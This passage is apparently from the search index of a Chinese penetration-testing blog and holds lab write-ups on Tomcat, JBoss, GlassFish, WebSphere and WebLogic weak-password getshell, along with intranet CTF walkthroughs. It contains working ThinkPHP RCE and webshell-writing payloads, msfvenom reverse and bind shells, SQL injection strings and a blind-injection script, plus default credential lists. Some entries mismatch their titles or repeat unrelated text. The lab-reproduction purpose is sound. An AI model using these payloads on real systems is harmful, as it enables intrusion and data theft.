9.0.13\n下载地址：\nhttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.13/bin/\njre环境变量设置\n​\t在tomcat的bin下面，找到setpath.bat，在其中添加以下内容后运行。\nset JAVA_HOME=C:\\Program Files\\Java\\jdk1.8.0_131\\set JRE_HOME=C:\\Program Files\\Java\\jdk1.8.0_131\\jre\n\n\n\n复现过程利用脚本下载地址：\nhttps://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi\n\n使用python2执行获取web.xml文件\npython2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.3.47 -p 8009 -f WEB-INF/web.xml   \n\n\n修复建议1、若不需要使用Tomcat AJP协议，可直接关闭AJP Connector，或将其监听地址改为仅监听本机localhost。\n2、若需使用Tomcat AJP协议，可根据使用版本配置协议属性设置认证凭证。\n3、升级tomcat版本。\n","categories":["漏洞复现"],"tags":["Tomcat"]},{"title":"CVE-2017-7504-JBossMQ-JMS-Deserialization???","url":"/2023/01/01/CodeReview-PHP-1day%E6%8C%96%E6%8E%98-phpMyWindCMS/","content":"描述​\tCVE-2007-1036 即 JMX Console HtmlAdaptor Getshell，因为 JBoss 中 &#x2F;jmx-console&#x2F;HtmlAdaptor 路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到 jmx 控制台，并在其中执行任何功能。\n注入使用的是vulhub中CVE-2017-7504的漏洞环境来做复现\n#进入漏洞目录cd vulhub/jboss/CVE-2017-7504#开启环境docker-compose up -d\n\n\n\n查看环境\nhttp://192.168.2.107:8080/\n\n\n\n复现过程直接访问该地址：http://192.168.3.50:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository\n找到下面store函数，通过向四个参数传参，达到上传 shell 的目的。\n其中 arg0 传入的是部署的 war 包名字，arg1 传入的是上传的文件的文件名，arg2 传入的是上传文件的文件格式，arg3 传入的是上传文件中的内容。通过控制这四个参数即可上传 shell，控制整台服务器，arg1 和 arg2 可以进行文件的拼接，例如 arg1&#x3D;she，arg2&#x3D;ll.jsp。这个时候服务器还是会进行拼接，将 shell.jsp 传入到指定路径下。\n蚁剑连接\n修复建议1、将JBoss后台添加权限，控制访问者对敏感路径访问\n2、若不使用控制平台管理，建议关闭jmx-console和web-console，提高安全性。删除jmx-console.war和web-console.war，在以下路径。\njboss\\server\\all\\deploy\\jmx-console.warjboss\\server\\default\\deploy\\jmx-console.war\n\n3、目前官方已经发布了升级补丁以修复这个安全问题，请到官网的主页下载：http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1036\n","categories":["代码审计"],"tags":["PHP代码审计","1day挖掘"]},{"title":"JBoss-Weak-password-Backend-Getshell","url":"/2022/10/21/JBoss-Weak-password-Backend-Getshell/","content":"描述​\t由于JBoss中Administration Console 存在默认密码admin/admin或者弱口令， 所以我们可以登录到后台通过部署war包getshell。\n影响版本全版本\n环境搭建这里使用vulnhub上面CVE-2015-7501的环境来复现该漏洞。\n#进入漏洞目录cd vulhub/jboss/JMXInvokerServlet-deserialization#开启环境docker-compose up -d\n\n\n\n查看环境\nhttp://192.168.3.50:8080/\n\n\n因为这里使用的是vulhub的环境，所以需要去环境里面查看后台的密码。\n[root@localhost ~]#docker ps[root@localhost ~]#docker exec -it 374772b7c889 /bin/bashroot@374772b7c889:/# cat jboss-6.1.0.Final/server/default/conf/props/jmx-console-users.properties \n\n\n复现过程进入页面，点击Administration console\n\n输入账号密码admin/vulhub\n\n点击Web application ,然后点击右上角的add\n\n\n\n\n蚁剑连接\n\n\n修复建议1、将JBoss后台添加权限，控制访问者对敏感路径访问\n2、若不使用控制平台管理，建议关闭jmx-console和web-console，提高安全性。删除jmx-console.war和web-console.war，在以下路径。\njboss\\server\\all\\deploy\\jmx-console.warjboss\\server\\default\\deploy\\jmx-console.war\n\n","categories":["漏洞复现"],"tags":["JBoss"]},{"title":"JBoss-JMX-Console-Unauthorized","url":"/2022/10/24/JBoss-JMX-Console-Unauthorized/","content":"描述​\tWebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为&#x2F;ws_utc&#x2F;begin.do，&#x2F;ws_utc&#x2F;config.do。\n影响版本全版本\n环境搭建这里使用docker拉取testjboss来复现该漏洞。\ndocker search testjbossdocker pull testjboss/jbossdocker run -p 8080:8080 -d docker-compose up -d testjboss/jboss\n\n\n\n\n查看环境\nhttp://192.168.3.50:8080/\n\n\n因为这里使用的是vulhub的环境，所以需要去环境里面查看后台的密码。\n[root@localhost ~]#docker ps[root@localhost ~]#docker exec -it 374772b7c889 /bin/bashroot@374772b7c889:/# cat jboss-6.1.0.Final/server/default/conf/props/jmx-console-users.properties \n\n\n复现过程进入页面，点击JMX console\n\n找到jboss.deployment\n\n找到addURL，在服务器上放好war包，提供给远程下载。\njar cvf shell.war shell.jsppython3 -m http.server 1111192.168.3.61:1111/shell.war\n\n\n\n\n\n\n点击Web application ,然后点击右上角的add\n蚁剑连接\n\n\n修复建议1、将JBoss后台添加权限，控制访问者对敏感路径访问\n2、若不使用控制平台管理，建议关闭jmx-console和web-console，提高安全性。删除jmx-console.war和web-console.war，在以下路径。\njboss\\server\\all\\deploy\\jmx-console.warjboss\\server\\default\\deploy\\jmx-console.war\n\n","categories":["漏洞复现"],"tags":["JBoss"]},{"title":"GlassFish-Weak-password-Backend-Getshell","url":"/2022/11/01/GlassFish-Weak-password-Backend-Getshell/","content":"描述​\t由于GlassFish 存在直接通过弱口令登录， 所以我们可以登录到后台通过部署war包从而getshell。\n影响版本GlassFish&lt; 4.1.1（不含 4.1.1）\n漏洞检测访问以下管理地址，如果存在空口令或者弱密码则存在该漏洞。\nhttps://192.168.3.96:4848/\n\n\n环境搭建这里使用的是glassfish4.1版本的环境：\ncd glassfish/4.1.0docker-compose up -d\n\n\n查看环境\nhttps://192.168.3.99:4848/common/index.jsf\n\n\n复现过程访问后台地址,通过弱口令进入后台：\nhttps://192.168.3.99:4848/common/index.jsf\n\n\n\n点击左侧的Applications\n\n选择war包后上传，Context Root为访问的路径，成功上传后通过antSword连接。\n\n\n\n\n\n修复建议1、不开放后台给外网。2、若开放密码强度需增加。\n","categories":["漏洞复现"],"tags":["GlassFish"]},{"title":"Tomcat-Weak-password&&Backend-Getshell","url":"/2022/10/19/Tomcat-Weak-password-Backend-Getshell/","content":"描述​\tTomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。\n​\t正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。\n影响版本全版本\n环境搭建使用vulhub搭建漏洞环境\n#进入漏洞目录cd vulhub/tomcat/tomcat8#开启环境docker-compose up -d\n\n\n查看环境\nhttp://192.168.3.50:8080/\n\n\n复现过程 进入manager页面，输入tomcat弱口令：tomcat/tomcat进入后台。\n\n\n\n​\t将1.jsp压缩为1.jsp.zip 然后将名称修改为abc.war，然后上传成功后可以看到页面出现abc的路径。\n\n连接路径是war的名称和脚本的名称，通过蚁剑测试，连接成功。\n\n\n修复建议1、在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。\n2、增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME&#x2F;conf&#x2F;web.xml文件设置锁定机制和时间超时限制。\n3、以及针对manager-gui&#x2F;manager-status&#x2F;manager-script等目录页面设置最小权限访问限制。\n4、修改弱口令为强口令或删除tomcat登录后台。\n","categories":["漏洞复现"],"tags":["Tomcat"]},{"title":"cc123","url":"/2023/06/01/cc123/","content":"靶场描述​\t该靶场作者为暗月，下图为cc123靶场拓扑图。\nWEB服务器使用的是vulhub中CVE-2017-7504的漏洞环境来做复现\n数据库服务器使用的是vulhub中CVE-2017-7504的漏洞环境来做复现\n目标主机1、将JBoss后台添加权限，控制访问者对敏感路径访问\n2、若不使用控制平台管理，建议关闭jmx-console和web-console，提高安全性。删除jmx-console.war和web-console.war，在以下路径。\njboss\\server\\all\\deploy\\jmx-console.warjboss\\server\\default\\deploy\\jmx-console.war\n\n3、目前官方已经发布了升级补丁以修复这个安全问题，请到官网的主页下载：http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1036\n","categories":["完整渗透测试靶场"],"tags":["PHP代码审计","1day挖掘"]},{"title":"WebSphere-Weak-password-Backend-Getshell","url":"/2022/10/31/WebSphere-Weak-password-Backend-Getshell/","content":"描述​\t由于WebSphere 存在直接通过user id或者弱口令登录， 所以我们可以登录到后台通过部署war包从而getshell。\n影响版本IBM Websphere Application Server 6.x至7.0\n漏洞检测访问以下URL，如果出现以下界面则存在该漏洞。\nhttp://192.168.3.91:9060/ibm/console/unsecureLogon.jsp\n\n\n环境搭建docker搭建环境：\ndocker pull iscrosales/websphere7docker run -d -p 9060:9060 -p 9043:9043 -p 8880:8880 -p 9080:9080 iscrosales/websphere7\n\n\n\n查看环境\nhttp://192.168.3.91:9060/\n\n\n复现过程访问URL，输入admin作为用户，无需密码即可登录。\nhttp://192.168.3.91:9060/ibm/console/unsecureLogon.jsp\n\n\n\n登录成功后依次点击：\nApplications\nApplications Types\nWebSphere enterprise applications\ninstall\n\n选择后门war包\n\n一直默认下一步，到Context Root编辑为：/shell\n\n\n点击Save\n\nSave后在WebSphere enterprise applications中选择上传到war包点击Start\n\n\nps:部署地址的端口为：9080\n蚁剑连接\n\n\n\n修复建议1、设置admin密码\n2、升级Websphere版本\n","categories":["漏洞复现"],"tags":["WebSphere"]},{"title":"Weblogic-Weak-password-Backend-Getshell","url":"/2022/10/28/Weblogic-Weak-password-Backend-Getshell/","content":"描述​\t由于WebLogic 存在默认密码weblogic:Oracle@123或者弱口令， 所以我们可以登录到后台通过部署war包getshell。\n影响版本\n\n\n漏洞检测​\t访问http://192.168.3.80:7001/console/login/LoginForm.jsp存在以下页面。若登录存在弱口令，则表示漏洞存在。\n\n环境搭建使用vulnhub环境来复现该漏洞。\n#进入漏洞目录cd vulhub/weblogic/weak_password#开启环境docker-compose up -d\n\n\n查看环境\nhttp://192.168.3.80:7001/console/login/LoginForm.jsp\n\n\n复现过程通过Weblogic弱口令进入管理后台。以下是一些为blogic常用弱口令。\nweblogic:Oracle@123system:Administratorweblogic:weblogicadmin:securityjoe:passwordmary:passwordsystem:securitywlcsystem:wlcsystemwlpisystem:wlpisystem\n\n这里环境的弱口令为：weblogic:Oracle@123。\n\n点击部署然后点击安装\n\n\n点击上载文件\n\n选择好文件后，继续下一步。\n\n点击安装为应用程序\n\n随后点击完成。\n\n\nwebshell部署完成，使用蚁剑连接后门。\n\n\n\n修复建议1、对默认的用户名&#x2F;口令进行修改，防止攻击者利用初始口令进行暴力破解。\n2、系统设置强密码策略，建议用户密码采用10位以上数字加大小写字母。\n3、对密码暴力猜解行为进行图灵验证，一旦发现用户口令破解行为及时对账户进行限时封停处理。\n","categories":["漏洞复现"],"tags":["WebLogic"]},{"title":"target-cfs","url":"/2022/06/06/target-cfs/","content":"第一层扫描网段内主机┌──(kali㉿kali)-[~]└─$ nmap 192.168.2.0/24Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-19 16:35 CSTNmap scan report for 192.168.2.168Host is up (0.026s latency).Not shown: 993 closed portsPORT     STATE SERVICE21/tcp   open  ftp22/tcp   open  ssh80/tcp   open  http111/tcp  open  rpcbind888/tcp  open  accessbuilder3306/tcp open  mysql8888/tcp open  sun-answerbook\n\n扫描主机开放端口及服务──(kali㉿kali)-[~]└─$ nmap -sV 192.168.2.168Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-19 16:32 CSTNmap scan report for 192.168.2.168Host is up (0.024s latency).Not shown: 993 closed portsPORT     STATE SERVICE VERSION21/tcp   open  ftp     Pure-FTPd22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)80/tcp   open  http    nginx111/tcp  open  rpcbind 2-4 (RPC #100000)888/tcp  open  http    nginx3306/tcp open  mysql   MySQL (unauthorized)8888/tcp open  http    Ajenti http control panelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 27.38 seconds\n\n扫目录┌──(kali㉿kali)-[~/dirsearch]└─$ ./dirsearch.py -u http://192.168.2.168/ -e php -r \n\n进入网站发现为Tinkphp5\n验证-&gt;ThinkPHP5.x全版本任意命令执行# payloadhttp://192.168.2.168/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=pwd\n\n\n验证成功，构造命令写入一句话#写入一句话\t\tlinux下使用\\转义$\t\twindows下用^转义  还可以base64加密绕过echo &quot;&lt;?php @eval(\\$_POST[fff]);?&gt;&quot; &gt;shell.php# payloadindex.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo &quot;&lt;?php @eval(\\$_POST[fff]);?&gt;&quot; &gt;shell.php\n\n上线msf1.生成后门：msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.2.187 LPORT=1111 -f elf &gt;t1.elf 2.接受反弹：msfconsoleuse exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcpset LHOST 192.168.2.187set LPORT 1111exploit3.上传elf并执行(www:/www/wwwroot/ThinkPHP/public) $ chmod +x t1.elf(www:/www/wwwroot/ThinkPHP/public) $ ./t1.elf4.信息收集及配置访问获取网络接口：run get_local_subnets查看路由地址：run autoroute -p添加路由地址：run autoroute -s 192.168.22.0/24开启本地代理：use auxiliary/server/socks_proxy set srvport 2222set version 4a exploit 4.利用本地代理接口访问测试设置浏览器代理进行访问测试linux：配置proxychains（代理工具）后调用工具探针Target2/etc/proxychains.confsocks4 192.168.2.187 2222（在配置文件中添加）\n\n第二层扫描网段内主机，端口proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80 -Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。-sT：扫描TCP数据包已建立的连接connectproxychains4 nmap -Pn -sT  192.168.22.129Nmap scan report for 192.168.22.129Host is up (0.12s latency).Not shown: 994 closed portsPORT     STATE SERVICE21/tcp   open  ftp22/tcp   open  ssh80/tcp   open  http888/tcp  open  accessbuilder3306/tcp open  mysql8888/tcp open  sun-answerbook\n\n报错注入+后台+上传后门windows：利用代理工具Proxifier或SocksCap64载入代理进行进程访问测试 Target2（ubuntu x64）：探针目标-利用WEB漏洞(SQL注入)-后台获取webshell权限-获取Flag-Target3http://192.168.22.128/index.php?r=vul&amp;keyword=1 #sql注入http://192.168.22.128/index.php?r=admini/public/login #后台\n\nsql注入# sql手工注入1.报错----》存在注入http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27;# CDbCommand 无法执行 SQL 语句: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 12.显示当前库http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and info() --+# CDbCommand 无法执行 SQL 语句: SQLSTATE[42000]: Syntax error or access violation: 1305 FUNCTION bagecms.info does not exist3.报错注入获取铭感信息http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) --+# CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;~bagecms@localhost~&#x27;4.得到表名http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e),1)) --+# CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;~bage_admin~&#x27;5.获取列名http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;bage_admin&#x27; limit 1,1),0x7e),1)) --+     # CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;~username~&#x27;   http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;bage_admin&#x27; limit 2,1),0x7e),1)) --+     # CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;~password~&#x27;6.获取用户名，密码http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select concat_ws(&#x27;:&#x27;, username, password) from bage_admin limit 0,1),0x7e),1)) --+  # CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;~admin:46f94c8de14fb36680850768f&#x27;7.由于密码位数太长，需要截取获取后面的数据http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select concat_ws(&#x27;:&#x27;,substring_index(password,&#x27;f&#x27;,-4)) from bage_admin limit 0,1),0x7e),1)) --+  # CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;~b36680850768ff1b7f2a~&#x27;用户名：密码admin:46f94c8de14fb36680850768ff1b7f2a密码解密得：123qwe# sqlmap注入sqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --batchsqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --current-user --current-db --is-dba --passwords --batchsqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --batch --dbssqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --batch -D bagecms --tables#到处所有表，所有字段内容sqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --batch -D bagecms -tables --columns --dumpsqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --batch -D bagecms -T bage_admin --columns --dump+----+----------+----+---------------------+---------+-------------------+-------------------------------------------+----------+----------+-----------+-----------+-------------+-------------+----------------+-----------------+| id | group_id | qq | email               | mobile  | notebook          | password                                  | realname | username | status_is | telephone | create_time | login_count | last_login_ip  | last_login_time |+----+----------+----+---------------------+---------+-------------------+-------------------------------------------+----------+----------+-----------+-----------+-------------+-------------+----------------+-----------------+| 1  | 1        | 0  | bagecms@bagecms.com | &lt;blank&gt; | flag&#123;eS3sd1IKarw&#125; | 46f94c8de14fb36680850768ff1b7f2a (123qwe) | &lt;blank&gt;  | admin    | Y         | &lt;blank&gt;   | 1569240455  | 17          | 192.168.22.129 | 1637839057      |+----+----------+----+---------------------+---------+-------------------+-------------------------------------------+----------+----------+-----------+-----------+-------------+-------------+----------------+-----------------+http://192.168.22.128/index.php?r=special #后门shell\n\n上线msf1.生成正向后门：msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf &gt; t2.elf 2.访问接受：use exploit/multi/handlerset payload linux/x64/meterpreter/bind_tcpset rhost 192.168.22.129set LPORT 3333exploit 3.信息收集及配置访问获取网络接口：run get_local_subnets查看路由地址：run autoroute -p添加路由地址：run autoroute -s 192.168.33.0/24\n\n第三层Target3:（windows7 x64）探针目标-端口及漏洞扫描-利用MS17010获取系统权限-获取Flag-GGproxychains4 nmap -Pn -sT 192.168.33.33use exploit/windows/smb/ms17_010_psexecset payload windows/meterpreter/bind_tcpset RHOST 192.168.33.33exploitshelldir /S flag.txt /Btype xxxxx.txt\n","categories":["靶场wp"],"tags":["target","内网","cfs"]},{"title":"target-cc123","url":"/2022/08/15/target-labs4/","content":"靶场介绍​\t该靶场在打之前需要将网络按下面的网络示意图配置好，虚拟机的网卡设置这里就不过多介绍了。另外还需要配置修改靶场的DNS和本地的DNS服务器地址。\n网络示意图\nDNS修改​\t找到DNS管理器，在正向查找区域里将子域名的数据都修改为当前搭建环境中能与kali互通的网段IP，即192.168.2.11，然后重启DNS服务和网站。\n\n\n\n\n​\t\nDNS服务器绑定​\t将攻击的机器的DNS服务器地址改为目标靶场第一台WEB服务器的IP地址。具体配置如下：\nWindows环境​\t将首选DNS服务器地址填为目标WEB服务器的IP地址。\n\nkali环境​\t修改etc目录下面的resolv.conf文件。\n\n任务描述​\t该靶场中存在四个flag，第一层服务器有两个flag，其余两个靶机中均有一个flag。给定目标的域名为cc123.com。\n第一层：WEB服务器子域名收集​\t\nwfuzz -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u cc123.com -H &quot;Host:FUZZ.cc123.com&quot;  --hw 53,26\n\n\nIP端口及服务探针\nsudo nmap -sS -sV -T4 -p- -A 192.168.2.11       Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 192.168.2.11Host is up (0.022s latency).Not shown: 65526 filtered tcp ports (no-response)PORT      STATE SERVICE            VERSION21/tcp    open  ftp                Microsoft ftpd| ftp-syst: |_  SYST: Windows_NT53/tcp    open  domain             Microsoft DNS 6.1.7601 (1DB1446A) (Windows Server 2008 R2 SP1)| dns-nsid: |_  bind.version: Microsoft DNS 6.1.7601 (1DB1446A)80/tcp    open  http               Microsoft IIS httpd 7.5|_http-server-header: Microsoft-IIS/7.5| http-methods: |_  Potentially risky methods: TRACE|_http-title: IIS7135/tcp   open  msrpc              Microsoft Windows RPC999/tcp   open  http               Microsoft IIS httpd 7.5|_http-server-header: Microsoft-IIS/7.5| http-robots.txt: 1 disallowed entry |_/|_http-title: phpMyAdmin| http-methods: |_  Potentially risky methods: TRACE3389/tcp  open  ssl/ms-wbt-server?|_ssl-date: 2022-08-19T08:08:44+00:00; +1s from scanner time.| ssl-cert: Subject: commonName=WIN-KALKEMT3JMA| Not valid before: 2022-08-17T06:05:34|_Not valid after:  2023-02-16T06:05:34| rdp-ntlm-info: |   Target_Name: WIN-KALKEMT3JMA|   NetBIOS_Domain_Name: WIN-KALKEMT3JMA|   NetBIOS_Computer_Name: WIN-KALKEMT3JMA|   DNS_Domain_Name: WIN-KALKEMT3JMA|   DNS_Computer_Name: WIN-KALKEMT3JMA|   Product_Version: 6.1.7601|_  System_Time: 2022-08-19T08:08:36+00:006588/tcp  open  http               Microsoft IIS httpd 7.5|_http-server-header: Microsoft-IIS/7.5|_http-title: \\xBB\\xA4\\xCE\\xC0\\xC9\\xF1\\xA1\\xA4\\xD6\\xF7\\xBB\\xFA\\xB4\\xF3\\xCA\\xA6 V3.5.1 - \\xC7\\xB0\\xCC\\xA8\\xB5\\xC7\\xC2\\xBC| http-cookie-flags: |   /: |     ASPSESSIONIDAABDTCSA: |_      httponly flag not set| http-methods: |_  Potentially risky methods: TRACE49154/tcp open  msrpc              Microsoft Windows RPC49155/tcp open  msrpc              Microsoft Windows RPCMAC Address: 50:2B:73:A8:12:0F (Tenda Technology,Ltd.Dongguan branch)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portOS details: Microsoft Windows Server 2008 or 2008 Beta 3, Microsoft Windows Server 2008 R2 or Windows 8.1, Microsoft Windows 7 Professional or Windows 8, Microsoft Windows Embedded Standard 7, Microsoft Windows 8.1 R1, Microsoft Windows Phone 7.5 or 8.0, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008Network Distance: 1 hopService Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2:sp1TRACEROUTEHOP RTT      ADDRESS1   21.63 ms 192.168.2.11OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 195.26 seconds\n\n\n\nWeb服务总结主域名：\tcc123.com子域名：\twww.cc123.com\tww2.cc123.com\tnew.cc123.comIP及放开的web端口：\t192.168.2.11:80\t192.168.2.11:999\t192.168.2.11:6588\n\ncc123.com\n\n\n\nwww.cc123.com\n\n\n\nww2.cc123.com\n\nnew.cc123.com\n\n\n\n192.168.2.11:80\n\n192.168.2.11:999\n\n192.168.2.11:6588\n\n目录遍历​\t对上述的网站进行目录遍历，发现一些有用信息：\ndedecms 用户登录页面http://new.cc123.com/member/Grcms 后台登录口http://ww2.cc123.com/admin/Login.aspx \n\n\n\n\n漏洞利用dedecms查看版本信息​\t通过目录遍历找到了会员登录口，查看版本信息。\ndedecms/data/admin/ver.txt\n\n\n\ndede 20150618前台注入​\t通过搜索版本号对应漏洞，利用方式为登录会员中心，在系统设置里面的分类管理里面添加分类。\n\n​\t参考网上的文章，利用下面的python脚本拿到管理员的权限。\t\nimport urllib2import timeopener = urllib2.build_opener()opener.addheaders.append((&#x27;Cookie&#x27;, &#x27; _ga_7VBGV5VRLB=GS1.1.1660727069.1.0.1660727069.0.0.0; _ga=GA1.2.1328479163.1660727069; _ga_6NMMDGGQXS=GS1.1.1660727069.1.0.1660727069.0.0.0; PHPSESSID=06k4j63l1p56auav9qqht086k4; DedeUserID=4; DedeUserID__ckMd5=f02b1d395cb070ca; DedeLoginTime=1660899504; DedeLoginTime__ckMd5=1047815d583efef&#x27;))payloads = &#x27;abcdefghijklmnopqrstuvwxyz0123456789@_.&#x27;name = &quot;admin&quot; for i in range(1,21):     for p in payloads:         s1 = &quot;%s&quot; %(i)        s2 = &quot;%s&quot; %(ord(p))         s = &quot;http://new.cc123.com/member/mtypes.php?dopost=save&amp;_FILES[mtypename][name]=.xxxx&amp;_FILES[mtypename][type]=xxxxx&amp;_FILES[mtypename][tmp_name][a&#x27;%20and%20`&#x27;`.``.mtypeid%20or%20if(ascii(substr((select%20pwd%20from%20dede_admin%20limit%201),&quot;+s1+&quot;,1))%3d&quot;+s2+&quot;,sleep(3),0)%20and%20mtypeid%3d1%23]=w&amp;_FILES[mtypename][size]=.xxxx&quot;         start_time = time.time()         try:             req = urllib2.Request(s)                                    req_data=opener.open(req,timeout=10)             if time.time() - start_time &gt; 2.0:                 name = name+p                 print name+&#x27;.....&#x27;         except urllib2.URLError,e:              break print &#x27;password is %s&#x27;  % name\n\n\n\n后台文件上传​\t通过注入拿到后台管理员的密码，该后台附件管理中的文件式管理器可以直接上传php文件。\t\nhttp://new.cc123.com/dede/\n\n\n​\t文件上传路径\nhttp://new.cc123.com/uploads/\n\n\n\t\n​\tPHP后门不能执行命令，因为这里是IIS服务器，尝试上传ASP后门后成功。\n\nGrcms 后台登录口sqlmap把登录的数据包丢到sqlmap里面跑一遍，发现username参数存在堆叠注入。\n\n​\t既然有注入，直接用--os-shell，成功拿到高权限nt authority\\system。\n\n​\t因为这个网站是站库分离类型的网站，这里执行的命令是拓扑图上面的在拓扑上面的数据库服务器。\n手工测试抓到登录数据包进行测试，将username参数改为payload：admin&#39;or+1=1--+\t直接通过验证 \n\t\n\n文件上传​\t在管理后台找到editor编辑器，尝试\n权限提升msf​\t上传冰蝎马，反弹shell。\n\n\n​\t使用suggest查看可提权漏洞\nuse post/multi/recon/local_exploit_suggestermsf6 post(multi/recon/local_exploit_suggester) &gt; set session 1 session =&gt; 1msf6 post(multi/recon/local_exploit_suggester) &gt; exploit \n\n\n\n\n\n\n\nCobalt strike第二层：数据库服务器第三层：目标机器","categories":["靶场wp"],"tags":["target","内网","cc123"]},{"title":"vulnhub-IMF1","url":"/2022/08/08/vulnhub-IMF1/","content":"概述信息收集主机发现sudo nmap -sP 192.168.2.0/24[sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org )Nmap scan report for 192.168.2.159Host is up (0.11s latency).MAC Address: 50:2B:73:A0:02:39 (Tenda Technology,Ltd.Dongguan branch)Nmap scan report for 192.168.2.165Host is up (0.090s latency).MAC Address: 50:2B:73:A0:02:39 (Tenda Technology,Ltd.Dongguan branch)\n\n端口扫描sudo nmap -p- 192.168.2.165            Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 192.168.2.165Host is up (0.0079s latency).Not shown: 65534 filtered tcp ports (no-response)PORT   STATE SERVICE80/tcp open  httpMAC Address: 50:2B:73:A0:02:39 (Tenda Technology,Ltd.Dongguan branch)Nmap done: 1 IP address (1 host up) scanned in 114.97 seconds\n\n目录扫描dirsearch -u http://192.168.2.165/ -x 403\n\n\n​\t目录扫完，啥有用的信息都没获取到，这时只能在网站上面翻翻网页源码，看看有没有什么有用信息。\n\nflag1view-source:http://192.168.2.165/contact.php\n\n&lt;!-- flag1&#123;YWxsdGhlZmlsZXM=&#125; --&gt;\n\n\necho &quot;YWxsdGhlZmlsZXM=&quot; | base64 --decodeallthefiles  \n\n\n​\t这个参数暂时不知道怎么利用。\nflag2​\t拿到flag1后，没有什么往后走的有用信息，又仔细看了一下网页源码，发现有几个js文件名称比较怪，像是base64，通过组合解码得到flag2，并得到了一个路径：\nimfadministrator\necho &quot;ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==&quot; | base64 --decodeflag2&#123;aW1mYWRtaW5pc3RyYXRvcg==&#125;                                                                                                                            echo &quot;aW1mYWRtaW5pc3RyYXRvcg==&quot; | base64 --decodeimfadministrator\n\n\n&#x2F;imfadministrator\n\n漏洞利用用户枚举​\t随意输入用户密码登录，显示无效用户名，尝试contact.php中的用户名，结果返回无效密码。\nrmichaelsakeithestone\n\n\n\n\ncewl http://192.168.2.165/contact.php -w 